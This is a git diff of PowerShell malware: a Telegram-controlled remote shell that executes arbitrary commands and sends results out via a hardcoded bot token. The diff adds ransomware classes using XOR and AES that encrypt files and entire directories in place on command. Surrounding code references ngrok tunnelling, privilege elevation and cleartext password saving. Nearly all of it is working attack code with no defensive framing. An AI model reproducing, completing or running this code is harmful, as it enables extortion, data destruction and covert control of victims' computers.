@@ -8,14 +8,13 @@ class CryptoAc
         }
     }
 
-    [array]xorBytes($a,$b)
+    [void]writeXorBytes($a,$b,$sw)
     {
-        [array]$xored = @()
         for ($i=0; $i-lt $a.Length; $i++)
         {
-            $xored += ($a[$i] -bxor $b[$i])
-        }
-        return $xored
+            $xored = ($a[$i] -bxor $b[$i])
+            $sw.WriteLine($xored)
+        }  
     }
 
     [array]randKey($key)
@@ -24,14 +23,25 @@ class CryptoAc
         return $sha512.ComputeHash($key)
     }
 
-    hidden [array]spliter($data,$pointer)
+     hidden [array]spliter($data,$pointer)
     {
-        $block = @()
-        for ($i=$pointer;$i-lt $pointer+64;$i++)
-        {   
-            $block += $data[$i]
-        }
+        # $block = @()
+        # for ($i=$pointer;$i-lt $pointer+64;$i++)
+        # {   
+        #     $block += $data[$i]
+        # }
+        return $data[$pointer..($pointer+63)]
         return $block
+    }
+
+    [array]xorBytes($a,$b)
+    {
+        [array]$xored = @()
+        for ($i=0; $i-lt $a.Length; $i++)
+        {
+            $xored += ($a[$i] -bxor $b[$i])
+        }
+        return $xored
     }
 
     [array]randFirstKey($data,$key)
@@ -107,31 +117,38 @@ class CryptoAc
     [array] encrypt($data,$key)
     {
         $data = ([CryptoAc]::new()).pad($data)
-        echo ([CryptoAc]::new()).randKey($data) > "$env:APPDATA/ENENENACACAC.key"
+        $sw = new-object system.IO.StreamWriter("$env:APPDATA/ENENENACACAC.key")
+        foreach($i in (([CryptoAc]::new()).randKey($data)))
+        {
+            $sw.WriteLine($i)
+        }
         $key = ([CryptoAc]::new()).randFirstKey($data,$key)
+        $ca = ([CryptoAc]::new())
         for($i=0; $i-lt $data.Length; $i+=64)
         {
             $block = ([CryptoAc]::new()).spliter($data,$i)
-            $res = ([CryptoAc]::new()).xorBytes($block,$key)
+            ([CryptoAc]::new()).writexorBytes($block,$key,$sw)
             $key = ([CryptoAc]::new()).randKey($key)
-            echo $res >> "$env:APPDATA/ENENENACACAC.key" 
         }
-        $res = Get-Content "$env:APPDATA/ENENENACACAC.key" ; Remove-Item -Path "$env:APPDATA/ENENENACACAC.key"
-        return [System.Convert]::ToBase64String($res)
+        $sw.close()
+        $res = [System.IO.File]::ReadAllLines("$env:APPDATA/ENENENACACAC.key") ; Remove-Item -Path "$env:APPDATA/ENENENACACAC.key"
+        return $res
+        # return $res
     }
 
     [array]decrypt($data,$key)
     {
-        $data = [System.Convert]::FromBase64String($data)
         $key = ([CryptoAc]::new()).fKeyDecrypt($data,$key)
+        $sw = new-object system.IO.StreamWriter("$env:APPDATA/DECDECACACAC.key")
+        $ca = ([CryptoAc]::new())
         for($i=64; $i-lt $data.Length; $i+=64)
-        {
-            $block = ([CryptoAc]::new()).spliter($data,$i)
-            $res = ([CryptoAc]::new()).xorBytes($block,$key)
-            $key = ([CryptoAc]::new()).randKey($key) 
-            echo $res >> "$env:APPDATA/ENENENACACAC.key"
+       {
+            $block = $ca.spliter($data,$i)
+            $ca.writeXorBytes($block,$key,$sw)
+            $key = $ca.randKey($key) 
         }
-        $res = Get-Content "$env:APPDATA/ENENENACACAC.key" ; Remove-Item -Path "$env:APPDATA/ENENENACACAC.key"
+        $sw.close()
+        $res = [System.IO.File]::ReadAllLines("$env:APPDATA/DECDECACACAC.key") ; Remove-Item -Path "$env:APPDATA/DECDECACACAC.key"
         return ([CryptoAc]::new()).unpad($res)
     }
 
@@ -139,20 +156,108 @@ class CryptoAc
     {
         $data = [System.IO.File]::ReadAllBytes($path)
         $enc = ([CryptoAc]::new()).encrypt($data,$key)
-        # [System.IO.File]::WriteAllBytes($path,$enc)
-        $enc | out-file $path
+        [System.IO.File]::WriteAllBytes($path,$enc)
         return $true
     }
 
     [boolean]decryptFile($path,$key)
     {
-        $data = Get-Content $path
+        $data = [System.IO.File]::ReadAllBytes($path)
         $dec = ([CryptoAc]::new()).decrypt($data,$key)
         [System.IO.File]::WriteAllBytes($path,$dec)
         return $true
     }
 }
 
+
+class AEScrypto
+{
+    [array]genKey($password)
+    {
+        $sha = [System.Security.Cryptography.SHA256]::Create() ; $sha = $sha.ComputeHash([byte[]][char[]]$password)
+        return $sha
+    }
+
+    [array]genIV($key)
+    {
+        $sha = [System.Security.Cryptography.MD5]::Create()
+        return ($sha.ComputeHash($key))[0..15]
+    }
+
+    [array]encrypt($data,$key,$IV)
+    {
+        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aesManaged.Key = $key
+        $aesManaged.IV = $IV
+        $encryptor = $aesManaged.CreateEncryptor()
+        return $encryptor.TransformFinalBlock($data, 0, $data.Length)
+    }
+
+    [array]decrypt($data,$key,$IV)
+    {
+        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aesManaged.Key = $key
+        $aesManaged.IV = $IV
+        $decryptor = $aesManaged.CreateDecryptor()
+        return $decryptor.TransformFinalBlock($data,0, $data.Length)
+    }
+
+    [boolean]encryptFile($path,$key,$IV)
+    {
+        # $data = [System.IO.File]::ReadAllBytes($path)
+        $enc = ([AEScrypto]::new()).encrypt([System.IO.File]::ReadAllBytes($path),$key,$IV)
+        [System.IO.File]::WriteAllBytes($path,$enc)
+        return $true
+    }
+
+    [boolean]decryptFile($path,$key,$IV)
+    {
+        # $data = [System.IO.File]::ReadAllBytes($path)
+        $dec = ([AEScrypto]::new()).decrypt([System.IO.File]::ReadAllBytes($path),$key,$IV)
+        [System.IO.File]::WriteAllBytes($path,$dec)
+        return $true
+    }
+    [array]EncyptDirectory($path,$key,$iv)
+    {
+        $sec=@()
+        $fal=@()
+        foreach ($i in (GetFiles($path))){
+            try{
+                $i = [string](($i).FullName)
+                if(([System.IO.File]::Exists($i))-eq $true)
+                {
+                    ([AEScrypto]::new()).encryptFile($i,$key,$iv)
+                    $sec+="$i : sec"
+                }
+           }catch{
+               $fal+="$i : fai"
+            }
+        }
+        return $sec + $fal
+    }
+    [array]DecryptDirectory($path,$key,$iv)
+    {
+        $sec=@()
+        $fal=@()
+        foreach ($i in (GetFiles($path))){
+            try{
+                $i = [string](($i).FullName)
+                if(([System.IO.File]::Exists($i))-eq $true)
+                {
+                    ([AEScrypto]::new()).decryptFile($i,$key,$iv)
+                    $sec+="$i : sec"
+                }   
+            }catch{
+               $fal+="$i : fai"
+           }
+        }
+        return $sec + $fal
+    }
+}
 
 
 function run-asAdmin($path,$password)
@@ -437,13 +542,106 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
                     handle-client -apiToken $apiToken -chat_id $chat_id -update $null
                     Send-data -data "session closed." -chat_id $chat_id -apiToken $apiToken
                 }
+                ElseIf($command.contains('ransomware -AC ')){
+                    $key = (($command -split '-k ')[-1]).Trim()
+                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
+                    if([System.IO.File]::Exists($path)){
+                        Send-data -data "Trying to encrypt file..." -chat_id $chat_id -apiToken $apiToken
+                        try{
+                            $key = ([CryptoAc]::new()).genKey($key)
+                            ([CryptoAc]::new()).encryptFile($path,$key)
+                            Send-data -data "Successfuly completed!" -chat_id $chat_id -apiToken $apiToken
+                        }catch{
+                            Send-data -data "Failed to encrypt file -_-" -chat_id $chat_id -apiToken $apiToken
+                        }
+                    }else{
+                        Send-data -data "The file does not exist." -chat_id $chat_id -apiToken $apiToken
+                    }
+                }
+                ElseIf($command.contains('ransomfile -e -AES ')){
+                    $key = (($command -split '-k ')[-1]).Trim()
+                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
+                    if([System.IO.File]::Exists($path)){
+                        Send-data -data "Trying to encrypt file..." -chat_id $chat_id -apiToken $apiToken
+                        try{
+                            $key = ([AEScrypto]::new()).genKey($key)
+                            $iv = ([AEScrypto]::new()).genIV($key)
+                            if (([AEScrypto]::new()).encryptFile($path,$key,$iv)-eq $true){
+                                Send-data -data "Successfuly completed!" -chat_id $chat_id -apiToken $apiToken
+                            }else{
+                                Send-data -data "The file does not exist." -chat_id $chat_id -apiToken $apiToken
+                            }
+                        }catch{
+                            Send-data -data "Failed to encrypt file -_-" -chat_id $chat_id -apiToken $apiToken
+                        }
+                    }
+                }
+                ElseIf($command.contains('ransomfile -d -AES '))
+                {
+                    $key = (($command -split '-k ')[-1]).Trim()
+                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
+                    if([System.IO.File]::Exists($path)){
+                        try{
+                            $key = ([AEScrypto]::new()).genKey($key)
+                            $iv = ([AEScrypto]::new()).genIV($key)
+                            if (([AEScrypto]::new()).decryptFile($path,$key,$iv)-eq $true){
+                                Send-data -data "Successfuly completed!" -chat_id $chat_id -apiToken $apiToken
+                            }else{
+                                Send-data -data "Decryption failed." -chat_id $chat_id -apiToken $apiToken
+                            }
+                        }catch{
+                            Send-data -data "You cannot access this file -_-" -chat_id $chat_id -apiToken $apiToken
+                        }
+                    }else{
+                        Send-data -data "File does not exist -_-" -chat_id $chat_id -apiToken $apiToken
+                    }
+                }
+                ElseIf($command.contains('ransomdir -e -AES '))
+                {
+                    $key = (($command -split '-k ')[-1]).Trim()
+                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
+                    if(Test-Path $path){
+                        $key = ([AEScrypto]::new()).genKey($key)
+                        $iv = ([AEScrypto]::new()).genIV($key)
+                        $res = "" 
+                        foreach($i in (([AEScrypto]::new()).EncyptDirectory($path,$key,$iv))){
+                            $res+= "$i`n"
+                        }
+                        if($res.Length -eq 0)
+                        {
+                            Send-data -data "Operation was succesful" -chat_id $chat_id -apiToken $apiToken 
+                        }
+                        Send-data -data $res -chat_id $chat_id -apiToken $apiToken 
+                    }else{
+                        Send-data -data "No such a folder" -chat_id $chat_id -apiToken $apiToken
+                    }
+                }
+                ElseIf($command.contains('ransomdir -d -AES '))
+                {
+                    $key = (($command -split '-k ')[-1]).Trim()
+                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
+                    if(Test-Path $path){
+                        $key = ([AEScrypto]::new()).genKey($key)
+                        $iv = ([AEScrypto]::new()).genIV($key)
+                        $res = "" 
+                        foreach($i in (([AEScrypto]::new()).DecryptDirectory($path,$key,$iv))){
+                            $res+= "$i`n"
+                        }
+                        if($res.Length -eq 0)
+                        {
+                            Send-data -data "Operation was succesful" -chat_id $chat_id -apiToken $apiToken 
+                        }
+                        Send-data -data $res -chat_id $chat_id -apiToken $apiToken 
+                    }else{
+                        Send-data -data "No such a folder" -chat_id $chat_id -apiToken $apiToken
+                    }
+                }
                 else{
                     $output = Excmd $command
                     Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                 }
             }
         }    
-        
         catch 
         {
             $errors = 1
@@ -452,6 +650,7 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
     } 
 
 }
+
 
 function start-ngrok($port,$path)
 {
@@ -809,10 +1008,17 @@ function savePassword-clearText
     }
 }
 
-
+function GetFiles($path) 
+{ 
+    return Get-ChildItem -Path $path -Recurse -Force | where name -ne $null | Select-Object FullName
+}
 
 $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
 
 handle-client -apiToken  $apiToken -chat_id $chat_id -update "NotNull"
+
+# $command = 'ransomware -AC -p C:\Users\aronc\zxc.txt -k asdf'
+# $key = (($command -split '-k ')[-1]).Trim()
+# $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
 
